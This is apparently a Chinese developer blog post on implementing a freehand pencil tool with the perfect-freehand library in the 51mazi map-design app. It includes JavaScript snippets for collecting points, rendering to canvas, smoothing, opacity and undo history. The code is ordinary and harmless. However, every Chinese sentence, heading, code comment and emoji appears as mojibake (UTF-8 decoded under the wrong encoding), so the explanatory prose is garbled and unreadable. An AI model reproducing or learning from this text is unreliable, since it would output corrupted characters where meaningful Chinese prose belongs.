<li>âœï¸ æ‰‹ç»˜æ ‡è®°å’Œæ³¨é‡Š</li>
<li>ğŸ¨ è‡ªç”±åˆ›ä½œå’Œè‰å›¾ç»˜åˆ¶</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e64760976b614db398d51f7535cb634f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6b6Z5Zu95rWq5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767621052&amp;x-signature=n56pjcxYBE7vE7XjMQWv%2B5XUt0E%3D" alt="åœ°å›¾è®¾è®¡" loading="lazy"/></p>
<p><em>åœ°å›¾è®¾è®¡å·¥å…·ä¸­çš„ç”»ç¬”å·¥å…· - æµç•…è‡ªç„¶çš„ç»˜åˆ¶ä½“éªŒ</em></p>
<h3 data-id="heading-5">ğŸ”¬ æ ¸å¿ƒç®—æ³•ï¼šperfect-freehand</h3>
<h4 data-id="heading-6">ç®—æ³•åŸç†</h4>
<p>perfect-freehand æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨äºç”Ÿæˆå¹³æ»‘æ‰‹ç»˜çº¿æ¡çš„ç®—æ³•åº“ï¼Œå®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š</p>
<ol>
<li><strong>æ”¶é›†ç‚¹åæ ‡</strong>: è®°å½•é¼ æ ‡ç§»åŠ¨è¿‡ç¨‹ä¸­çš„æ‰€æœ‰ç‚¹</li>
<li><strong>å¹³æ»‘å¤„ç†</strong>: å¯¹ç‚¹åºåˆ—è¿›è¡Œå¹³æ»‘å¤„ç†ï¼Œæ¶ˆé™¤æŠ–åŠ¨</li>
<li><strong>å‹åŠ›æ¨¡æ‹Ÿ</strong>: æ ¹æ®é€Ÿåº¦å˜åŒ–æ¨¡æ‹Ÿå‹åŠ›ï¼Œè®©çº¿æ¡æœ‰ç²—ç»†å˜åŒ–</li>
<li><strong>ç”Ÿæˆè·¯å¾„</strong>: å°†å¤„ç†åçš„ç‚¹è½¬æ¢ä¸ºå¹³æ»‘çš„è·¯å¾„</li>
<li><strong>å¡«å……ç»˜åˆ¶</strong>: ä½¿ç”¨å¡«å……è€Œéæè¾¹ï¼Œç”Ÿæˆæ›´è‡ªç„¶çš„ç”»ç¬”æ•ˆæœ</li>
</ol>
<h4 data-id="heading-7">ä¸ºä»€ä¹ˆé€‰æ‹© perfect-freehandï¼Ÿ</h4>
<ul>
<li>ğŸ¨ <strong>è‡ªç„¶æ•ˆæœ</strong>: ç”Ÿæˆçš„çº¿æ¡æ›´æ¥è¿‘çœŸå®æ‰‹ç»˜æ•ˆæœ</li>
<li>âš¡ <strong>æ€§èƒ½ä¼˜ç§€</strong>: ç®—æ³•é«˜æ•ˆï¼Œé€‚åˆå®æ—¶ç»˜åˆ¶</li>
<li>ğŸ”§ <strong>æ˜“äºé›†æˆ</strong>: API ç®€æ´ï¼Œæ˜“äºä½¿ç”¨å’Œå®šåˆ¶</li>
<li>ğŸ“¦ <strong>è½»é‡çº§</strong>: åº“ä½“ç§¯å°ï¼Œä¸å½±å“åº”ç”¨æ€§èƒ½</li>
</ul>
<h4 data-id="heading-8">ç®—æ³•ä½¿ç”¨</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { getStroke } <span class="hljs-keyword">from</span> <span class="hljs-string">'perfect-freehand'</span>

<span class="hljs-comment">// é…ç½®å‚æ•°</span>
<span class="hljs-keyword">const</span> options = {
  <span class="hljs-attr">size</span>: strokeWidth,        <span class="hljs-comment">// ç”»ç¬”å¤§å°</span>
  <span class="hljs-attr">thinning</span>: <span class="hljs-number">0.6</span>,            <span class="hljs-comment">// å‹åŠ›å˜åŒ–å¼ºåº¦</span>
  <span class="hljs-attr">smoothing</span>: <span class="hljs-number">0.5</span>,           <span class="hljs-comment">// å¹³æ»‘åº¦</span>
  <span class="hljs-attr">streamline</span>: <span class="hljs-number">0.5</span>,          <span class="hljs-comment">// æµçº¿åŒ–ç¨‹åº¦</span>
  <span class="hljs-attr">easing</span>: <span class="hljs-function">(<span class="hljs-params">t</span>) =&gt;</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sin</span>((t * <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>) / <span class="hljs-number">2</span>),  <span class="hljs-comment">// ç¼“åŠ¨å‡½æ•°</span>
  <span class="hljs-attr">simulatePressure</span>: <span class="hljs-literal">true</span>    <span class="hljs-comment">// æ¨¡æ‹Ÿå‹åŠ›</span>
}

<span class="hljs-comment">// å°†ç‚¹æ•°ç»„è½¬æ¢ä¸ºè·¯å¾„</span>
<span class="hljs-keyword">const</span> inputPoints = points.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> [p.<span class="hljs-property">x</span>, p.<span class="hljs-property">y</span>])
<span class="hljs-keyword">const</span> stroke = <span class="hljs-title function_">getStroke</span>(inputPoints, options)

<span class="hljs-comment">// ç»˜åˆ¶è·¯å¾„</span>
ctx.<span class="hljs-title function_">beginPath</span>()
ctx.<span class="hljs-title function_">moveTo</span>(stroke[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>], stroke[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>])
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; stroke.<span class="hljs-property">length</span>; i++) {
  ctx.<span class="hljs-title function_">lineTo</span>(stroke[i][<span class="hljs-number">0</span>], stroke[i][<span class="hljs-number">1</span>])
}
ctx.<span class="hljs-title function_">closePath</span>()
ctx.<span class="hljs-title function_">fill</span>()
</code></pre>
<p><strong>å‚æ•°è¯´æ˜</strong>:</p>
<ul>
<li><code>size</code>: ç”»ç¬”çš„åŸºç¡€å¤§å°</li>
<li><code>thinning</code>: æ§åˆ¶çº¿æ¡ç²—ç»†å˜åŒ–ï¼Œå€¼è¶Šå¤§å˜åŒ–è¶Šæ˜æ˜¾</li>
<li><code>smoothing</code>: æ§åˆ¶å¹³æ»‘ç¨‹åº¦ï¼Œå€¼è¶Šå¤§çº¿æ¡è¶Šå¹³æ»‘</li>
<li><code>streamline</code>: æ§åˆ¶æµçº¿åŒ–ç¨‹åº¦ï¼Œè®©çº¿æ¡æ›´æµç•…</li>
<li><code>simulatePressure</code>: æ˜¯å¦æ¨¡æ‹Ÿå‹åŠ›ï¼Œæ ¹æ®é€Ÿåº¦å˜åŒ–è°ƒæ•´ç²—ç»†</li>
</ul>
<blockquote>
<p>ğŸ’¡ <strong>å®Œæ•´ç®—æ³•å®ç°è¯·æŸ¥çœ‹</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap%2FuseRender.js" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/composables/map/useRender.js" ref="nofollow noopener noreferrer">src/renderer/src/composables/map/useRender.js</a></p>
</blockquote>
<h3 data-id="heading-9">ğŸ¯ æŠ€æœ¯æŒ‘æˆ˜</h3>
<h4 data-id="heading-10">æŒ‘æˆ˜ 1: ç‚¹åæ ‡çš„æ”¶é›†ä¸å­˜å‚¨</h4>
<p>åœ¨ç»˜åˆ¶è¿‡ç¨‹ä¸­ï¼Œéœ€è¦å®æ—¶æ”¶é›†é¼ æ ‡ç§»åŠ¨çš„ç‚¹åæ ‡ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseDown</span>(<span class="hljs-params">pos</span>) {
  <span class="hljs-comment">// å¼€å§‹æ–°çš„ç”»ç¬”è·¯å¾„</span>
  elements.<span class="hljs-property">currentFreeDrawPath</span>.<span class="hljs-property">value</span> = {
    <span class="hljs-attr">type</span>: <span class="hljs-string">'freedraw'</span>,
    <span class="hljs-attr">points</span>: [{ <span class="hljs-attr">x</span>: pos.<span class="hljs-property">x</span>, <span class="hljs-attr">y</span>: pos.<span class="hljs-property">y</span> }],  <span class="hljs-comment">// åˆå§‹åŒ–ç¬¬ä¸€ä¸ªç‚¹</span>
    <span class="hljs-attr">color</span>: color.<span class="hljs-property">value</span>,
    <span class="hljs-attr">strokeWidth</span>: size.<span class="hljs-property">value</span>,
    <span class="hljs-attr">opacity</span>: opacity.<span class="hljs-property">value</span>,
    <span class="hljs-attr">id</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>().<span class="hljs-title function_">toString</span>()
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseMove</span>(<span class="hljs-params">pos</span>) {
  <span class="hljs-comment">// æ·»åŠ ç‚¹åˆ°å½“å‰è·¯å¾„</span>
  elements.<span class="hljs-property">currentFreeDrawPath</span>.<span class="hljs-property">value</span>.<span class="hljs-property">points</span>.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">x</span>: pos.<span class="hljs-property">x</span>, <span class="hljs-attr">y</span>: pos.<span class="hljs-property">y</span> })
  <span class="hljs-comment">// å®æ—¶æ¸²æŸ“</span>
  <span class="hljs-title function_">renderCanvas</span>(<span class="hljs-literal">false</span>)
}
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>:</p>
<ul>
<li>âœ… ä½¿ç”¨æ•°ç»„å­˜å‚¨ç‚¹åºåˆ—ï¼Œä¿æŒé¡ºåº</li>
<li>âœ… å®æ—¶æ·»åŠ ç‚¹ï¼Œç¡®ä¿è½¨è¿¹å®Œæ•´</li>
<li>âœ… æ¯æ¬¡ç§»åŠ¨éƒ½è§¦å‘æ¸²æŸ“ï¼Œä¿è¯æµç•…æ€§</li>
</ul>
<h4 data-id="heading-11">æŒ‘æˆ˜ 2: å®æ—¶æ¸²æŸ“çš„æ€§èƒ½</h4>
<p>ç»˜åˆ¶è¿‡ç¨‹ä¸­éœ€è¦é¢‘ç¹æ¸²æŸ“ï¼Œæ€§èƒ½ä¼˜åŒ–è‡³å…³é‡è¦ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseMove</span>(<span class="hljs-params">pos</span>) {
  <span class="hljs-keyword">if</span> (elements.<span class="hljs-property">currentFreeDrawPath</span>.<span class="hljs-property">value</span>) {
    elements.<span class="hljs-property">currentFreeDrawPath</span>.<span class="hljs-property">value</span>.<span class="hljs-property">points</span>.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">x</span>: pos.<span class="hljs-property">x</span>, <span class="hljs-attr">y</span>: pos.<span class="hljs-property">y</span> })
    <span class="hljs-comment">// ä¸æ›´æ–°è¾¹ç•Œï¼Œé¿å…é¢‘ç¹è®¡ç®—å¯¼è‡´æ€§èƒ½é—®é¢˜</span>
    <span class="hljs-title function_">renderCanvas</span>(<span class="hljs-literal">false</span>)
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseUp</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// ç»˜åˆ¶å®Œæˆæ—¶æ‰æ›´æ–°è¾¹ç•Œ</span>
  <span class="hljs-title function_">renderCanvas</span>(<span class="hljs-literal">true</span>)
}
</code></pre>
<p><strong>ä¼˜åŒ–ç­–ç•¥</strong>:</p>
<ul>
<li>âš¡ ç»˜åˆ¶è¿‡ç¨‹ä¸­ä¸æ›´æ–°è¾¹ç•Œï¼ˆ<code>renderCanvas(false)</code>ï¼‰</li>
<li>âš¡ åªåœ¨ç»˜åˆ¶å®Œæˆæ—¶æ›´æ–°è¾¹ç•Œï¼ˆ<code>renderCanvas(true)</code>ï¼‰</li>
<li>âš¡ å‡å°‘ä¸å¿…è¦çš„è®¡ç®—ï¼Œæå‡æ¸²æŸ“æ€§èƒ½</li>
</ul>
<h4 data-id="heading-12">æŒ‘æˆ˜ 3: è·¯å¾„çš„å¹³æ»‘å¤„ç†</h4>
<p>åŸå§‹çš„ç‚¹åºåˆ—å¯èƒ½å­˜åœ¨æŠ–åŠ¨ï¼Œéœ€è¦é€šè¿‡ç®—æ³•å¹³æ»‘å¤„ç†ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> options = {
  <span class="hljs-attr">smoothing</span>: <span class="hljs-number">0.5</span>,      <span class="hljs-comment">// å¹³æ»‘åº¦ï¼šå€¼è¶Šå¤§è¶Šå¹³æ»‘</span>
  <span class="hljs-attr">streamline</span>: <span class="hljs-number">0.5</span>,     <span class="hljs-comment">// æµçº¿åŒ–ï¼šè®©çº¿æ¡æ›´æµç•…</span>
  <span class="hljs-attr">thinning</span>: <span class="hljs-number">0.6</span>        <span class="hljs-comment">// å‹åŠ›å˜åŒ–ï¼šæ¨¡æ‹ŸçœŸå®ç”»ç¬”</span>
}
</code></pre>
<p><strong>æ•ˆæœå¯¹æ¯”</strong>:</p>
<ul>
<li>âŒ <strong>æœªå¤„ç†</strong>: çº¿æ¡é”¯é½¿æ˜æ˜¾ï¼Œä¸å¤Ÿå¹³æ»‘</li>
<li>âœ… <strong>å¤„ç†å</strong>: çº¿æ¡æµç•…è‡ªç„¶ï¼Œæ¥è¿‘æ‰‹ç»˜æ•ˆæœ</li>
</ul>
<h4 data-id="heading-13">æŒ‘æˆ˜ 4: é€æ˜åº¦çš„å¤„ç†</h4>
<p>æ”¯æŒé€æ˜åº¦æ§åˆ¶ï¼Œè®©ç”»ç¬”æ•ˆæœæ›´ä¸°å¯Œï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">ctx.<span class="hljs-title function_">save</span>()
ctx.<span class="hljs-property">globalAlpha</span> = (element.<span class="hljs-property">opacity</span> || <span class="hljs-number">100</span>) / <span class="hljs-number">100</span>
ctx.<span class="hljs-property">fillStyle</span> = element.<span class="hljs-property">color</span>
<span class="hljs-comment">// ç»˜åˆ¶è·¯å¾„</span>
ctx.<span class="hljs-title function_">fill</span>()
ctx.<span class="hljs-title function_">restore</span>()
</code></pre>
<h3 data-id="heading-14">âœ¨ å®ç°äº®ç‚¹</h3>
<h4 data-id="heading-15">1. æ¨¡å—åŒ–çš„ Composables æ¶æ„</h4>
<p>ç”»ç¬”å·¥å…·é‡‡ç”¨ Composables æ¶æ„ï¼Œå®ç°äº†é«˜å†…èšã€ä½è€¦åˆï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">usePencilTool</span>(<span class="hljs-params">{
  canvasRef,
  elements,
  history,
  renderCanvas,
  color,
  size,
  opacity
}</span>) {
  <span class="hljs-keyword">const</span> drawingActive = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)
  
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseDown</span>(<span class="hljs-params">pos</span>) { <span class="hljs-comment">/* ... */</span> }
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseMove</span>(<span class="hljs-params">pos</span>) { <span class="hljs-comment">/* ... */</span> }
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseUp</span>(<span class="hljs-params"/>) { <span class="hljs-comment">/* ... */</span> }
  
  <span class="hljs-keyword">return</span> {
    drawingActive,
    onMouseDown,
    onMouseMove,
    onMouseUp
  }
}
</code></pre>
<p><strong>ä¼˜åŠ¿</strong>:</p>
<ul>
<li>âœ… ä»£ç ç»„ç»‡æ¸…æ™°ï¼Œæ˜“äºç»´æŠ¤</li>
<li>âœ… åŠŸèƒ½ç‹¬ç«‹ï¼Œä¾¿äºæµ‹è¯•</li>
<li>âœ… å¯å¤ç”¨æ€§å¼ºï¼Œæ˜“äºæ‰©å±•</li>
</ul>
<h4 data-id="heading-16">2. çŠ¶æ€ç®¡ç†</h4>
<p>ä½¿ç”¨å“åº”å¼çŠ¶æ€ç®¡ç†ç»˜åˆ¶çŠ¶æ€ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> drawingActive = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)  <span class="hljs-comment">// æ˜¯å¦æ­£åœ¨ç»˜åˆ¶</span>
<span class="hljs-keyword">const</span> lastPoint = <span class="hljs-title function_">ref</span>({ <span class="hljs-attr">x</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">0</span> })  <span class="hljs-comment">// ä¸Šä¸€ä¸ªç‚¹</span>

<span class="hljs-comment">// åœ¨ç»˜åˆ¶è¿‡ç¨‹ä¸­æ›´æ–°çŠ¶æ€</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseDown</span>(<span class="hljs-params">pos</span>) {
  drawingActive.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
  lastPoint.<span class="hljs-property">value</span> = { ...pos }
}
</code></pre>
<h4 data-id="heading-17">3. å†å²è®°å½•é›†æˆ</h4>
<p>å®Œæ•´çš„æ’¤é”€/é‡åšæ”¯æŒï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseDown</span>(<span class="hljs-params">pos</span>) {
  history.<span class="hljs-property">value</span>.<span class="hljs-title function_">saveState</span>()  <span class="hljs-comment">// å¼€å§‹ç»˜åˆ¶å‰ä¿å­˜çŠ¶æ€</span>
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseUp</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">if</span> (elements.<span class="hljs-property">currentFreeDrawPath</span>.<span class="hljs-property">value</span>.<span class="hljs-property">points</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">1</span>) {
    elements.<span class="hljs-property">freeDrawElements</span>.<span class="hljs-property">value</span>.<span class="hljs-title function_">push</span>({ ...elements.<span class="hljs-property">currentFreeDrawPath</span>.<span class="hljs-property">value</span> })
    history.<span class="hljs-property">value</span>.<span class="hljs-title function_">saveState</span>()  <span class="hljs-comment">// ç»˜åˆ¶å®Œæˆåä¿å­˜çŠ¶æ€</span>
  }
}
</code></pre>
<h4 data-id="heading-18">4. è·¯å¾„æ•°æ®ç»“æ„</h4>
<p>æ¸…æ™°çš„æ•°æ®ç»“æ„è®¾è®¡ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">{
  <span class="hljs-attr">type</span>: <span class="hljs-string">'freedraw'</span>,
  <span class="hljs-attr">points</span>: [
    { <span class="hljs-attr">x</span>: <span class="hljs-number">100</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">200</span> },
    { <span class="hljs-attr">x</span>: <span class="hljs-number">105</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">205</span> },
    <span class="hljs-comment">// ... æ›´å¤šç‚¹</span>
  ],
  <span class="hljs-attr">color</span>: <span class="hljs-string">'#222222'</span>,
  <span class="hljs-attr">strokeWidth</span>: <span class="hljs-number">5</span>,
  <span class="hljs-attr">opacity</span>: <span class="hljs-number">100</span>,
  <span class="hljs-attr">id</span>: <span class="hljs-string">'1234567890'</span>
}
</code></pre>
<p><strong>è®¾è®¡è€ƒè™‘</strong>:</p>
<ul>
<li>âœ… ä½¿ç”¨ç‚¹æ•°ç»„å­˜å‚¨è·¯å¾„ï¼Œä¾¿äºåºåˆ—åŒ–</li>
<li>âœ… åŒ…å«æ‰€æœ‰å¿…è¦å±æ€§ï¼Œæ”¯æŒå®Œæ•´æ¢å¤</li>
<li>âœ… å”¯ä¸€ ID ä¾¿äºå…ƒç´ ç®¡ç†</li>
</ul>
<blockquote>
<p>ğŸ’¡ <strong>å®Œæ•´å®ç°ä»£ç è¯·æŸ¥çœ‹</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap%2Ftools%2FusePencilTool.js" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/composables/map/tools/usePencilTool.js" ref="nofollow noopener noreferrer">src/renderer/src/composables/map/tools/usePencilTool.js</a></p>
</blockquote>
<h3 data-id="heading-19">âš¡ æ€§èƒ½ä¼˜åŒ–</h3>
<h4 data-id="heading-20">1. å»¶è¿Ÿè¾¹ç•Œæ›´æ–°</h4>
<p>ç»˜åˆ¶è¿‡ç¨‹ä¸­ä¸æ›´æ–°è¾¹ç•Œï¼Œå‡å°‘è®¡ç®—å¼€é”€ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç»˜åˆ¶è¿‡ç¨‹ä¸­ï¼šä¸æ›´æ–°è¾¹ç•Œ</span>
<span class="hljs-title function_">renderCanvas</span>(<span class="hljs-literal">false</span>)

<span class="hljs-comment">// ç»˜åˆ¶å®Œæˆï¼šæ›´æ–°è¾¹ç•Œ</span>
<span class="hljs-title function_">renderCanvas</span>(<span class="hljs-literal">true</span>)
</code></pre>
<p><strong>ä¼˜åŒ–æ•ˆæœ</strong>:</p>
<ul>
<li>âš¡ å‡å°‘è¾¹ç•Œè®¡ç®—æ¬¡æ•°</li>
<li>âš¡ æå‡ç»˜åˆ¶æµç•…åº¦</li>
<li>âš¡ é™ä½ CPU å ç”¨</li>
</ul>
<h4 data-id="heading-21">2. ç‚¹æ•°ç»„ä¼˜åŒ–</h4>
<p>åˆç†æ§åˆ¶ç‚¹æ•°ç»„å¤§å°ï¼Œé¿å…å†…å­˜å ç”¨è¿‡å¤§ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åªåœ¨ç»˜åˆ¶å®Œæˆæ—¶æ·»åŠ åˆ°å…ƒç´ æ•°ç»„</span>
<span class="hljs-keyword">if</span> (elements.<span class="hljs-property">currentFreeDrawPath</span>.<span class="hljs-property">value</span>.<span class="hljs-property">points</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">1</span>) {
  elements.<span class="hljs-property">freeDrawElements</span>.<span class="hljs-property">value</span>.<span class="hljs-title function_">push</span>({ ...elements.<span class="hljs-property">currentFreeDrawPath</span>.<span class="hljs-property">value</span> })
}
</code></pre>
<h4 data-id="heading-22">3. æ¸²æŸ“ä¼˜åŒ–</h4>
<p>ä½¿ç”¨ Canvas çš„é«˜æ•ˆç»˜åˆ¶ APIï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä½¿ç”¨ fill è€Œé strokeï¼Œæ•ˆæœæ›´è‡ªç„¶</span>
ctx.<span class="hljs-property">fillStyle</span> = element.<span class="hljs-property">color</span>
ctx.<span class="hljs-title function_">fill</span>()
</code></pre>
<h4 data-id="heading-23">4. çŠ¶æ€æ¸…ç†</h4>
<p>åŠæ—¶æ¸…ç†ä¸´æ—¶çŠ¶æ€ï¼Œé¿å…å†…å­˜æ³„æ¼ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseUp</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// å®Œæˆç»˜åˆ¶åæ¸…ç†ä¸´æ—¶è·¯å¾„</span>
  elements.<span class="hljs-property">currentFreeDrawPath</span>.<span class="hljs-property">value</span> = <span class="hljs-literal">null</span>
  drawingActive.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
}
</code></pre>
<h3 data-id="heading-24">ğŸ“Š å®ç°æµç¨‹å›¾</h3>
<pre><code class="hljs language-markdown" lang="markdown">ç”¨æˆ·æŒ‰ä¸‹é¼ æ ‡
<span class="hljs-code">    â†“
åˆ›å»ºæ–°çš„ç”»ç¬”è·¯å¾„
    â”œâ”€ åˆå§‹åŒ–ç‚¹æ•°ç»„
    â”œâ”€ è®¾ç½®é¢œè‰²ã€å¤§å°ã€é€æ˜åº¦
    â””â”€ ä¿å­˜å†å²çŠ¶æ€
    â†“
é¼ æ ‡ç§»åŠ¨
    â”œâ”€ æ·»åŠ ç‚¹åˆ°è·¯å¾„
    â””â”€ å®æ—¶æ¸²æŸ“ï¼ˆä¸æ›´æ–°è¾¹ç•Œï¼‰
    â†“
ç»§ç»­ç§»åŠ¨...
    â†“
ç”¨æˆ·é‡Šæ”¾é¼ æ ‡
    â”œâ”€ æ£€æŸ¥è·¯å¾„æœ‰æ•ˆæ€§ï¼ˆè‡³å°‘2ä¸ªç‚¹ï¼‰
    â”œâ”€ æ·»åŠ åˆ°å…ƒç´ æ•°ç»„
    â”œâ”€ æ›´æ–°è¾¹ç•Œ
    â””â”€ ä¿å­˜å†å²çŠ¶æ€
    â†“
å®Œæˆç»˜åˆ¶
</span></code></pre>
<h3 data-id="heading-25">ğŸ“ æ€»ç»“</h3>
<p>ç”»ç¬”å·¥å…·è™½ç„¶çœ‹ä¼¼ç®€å•ï¼Œä½†å®ç°è¿‡ç¨‹ä¸­æ¶‰åŠäº†å¤šä¸ªæŠ€æœ¯é¢†åŸŸï¼š</p>
<ul>
<li>ğŸ¨ <strong>ç®—æ³•åº”ç”¨</strong>: perfect-freehand ç®—æ³•çš„é›†æˆå’Œä½¿ç”¨</li>
<li>ğŸ“Š <strong>çŠ¶æ€ç®¡ç†</strong>: å“åº”å¼çŠ¶æ€çš„ç®¡ç†å’ŒåŒæ­¥</li>
<li>âš¡ <strong>æ€§èƒ½ä¼˜åŒ–</strong>: å®æ—¶æ¸²æŸ“çš„æ€§èƒ½ä¼˜åŒ–ç­–ç•¥</li>
<li>ğŸ”„ <strong>å†å²è®°å½•</strong>: å®Œæ•´çš„æ’¤é”€/é‡åšæ”¯æŒ</li>
<li>ğŸ—ï¸ <strong>æ¶æ„è®¾è®¡</strong>: æ¨¡å—åŒ–çš„ Composables æ¶æ„</li>
</ul>
<p>é€šè¿‡æ¨¡å—åŒ–çš„ Composables æ¶æ„ï¼Œæˆ‘ä»¬å°†ç”»ç¬”å·¥å…·å°è£…ä¸ºç‹¬ç«‹çš„ <code>usePencilTool</code>ï¼Œå®ç°äº†é«˜å†…èšã€ä½è€¦åˆçš„ä»£ç ç»“æ„ï¼Œä¾¿äºç»´æŠ¤å’Œæ‰©å±•ã€‚</p>
<h4 data-id="heading-26">ğŸš€ ä¸‹ä¸€æ­¥æ¢ç´¢</h4>
<p>å¦‚æœä½ æƒ³æ·±å…¥äº†è§£ï¼š</p>
<ul>
<li>ğŸ“– <strong>å®Œæ•´ä»£ç å®ç°</strong>: æŸ¥çœ‹ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap%2Ftools%2FusePencilTool.js" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/composables/map/tools/usePencilTool.js" ref="nofollow noopener noreferrer">usePencilTool.js</a></li>
<li>ğŸ¨ <strong>æ¸²æŸ“ç³»ç»Ÿ</strong>: æŸ¥çœ‹ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap%2FuseRender.js" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/composables/map/useRender.js" ref="nofollow noopener noreferrer">useRender.js</a></li>
<li>ğŸ—ºï¸ <strong>åœ°å›¾è®¾è®¡å·¥å…·</strong>: æŸ¥çœ‹ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fviews%2FMapDesign.vue" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/views/MapDesign.vue" ref="nofollow noopener noreferrer">MapDesign.vue</a></li>
<li>ğŸ“š <strong>perfect-freehand</strong>: æŸ¥çœ‹ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsteveruizok%2Fperfect-freehand" target="_blank" title="https://github.com/steveruizok/perfect-freehand" ref="nofollow noopener noreferrer">perfect-freehand æ–‡æ¡£</a></li>
</ul>
<hr/>
<h4 data-id="heading-27">ğŸ“š ç›¸å…³é“¾æ¥</h4>
<ul>
<li><strong>é¡¹ç›®åœ°å€</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi" ref="nofollow noopener noreferrer">GitHub - 51mazi</a>ï¼Œç»™ä¸ª Star å“¦~</li>
<li><strong>ç”»ç¬”å·¥å…·ä»£ç </strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap%2Ftools%2FusePencilTool.js" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/composables/map/tools/usePencilTool.js" ref="nofollow noopener noreferrer">src/renderer/src/composables/map/tools/usePencilTool.js</a></li>
<li><strong>æ¸²æŸ“å‡½æ•°</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap%2FuseRender.js" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/composables/map/useRender.js" ref="nofollow noopener noreferrer">src/renderer/src/composables/map/useRender.js</a></li>
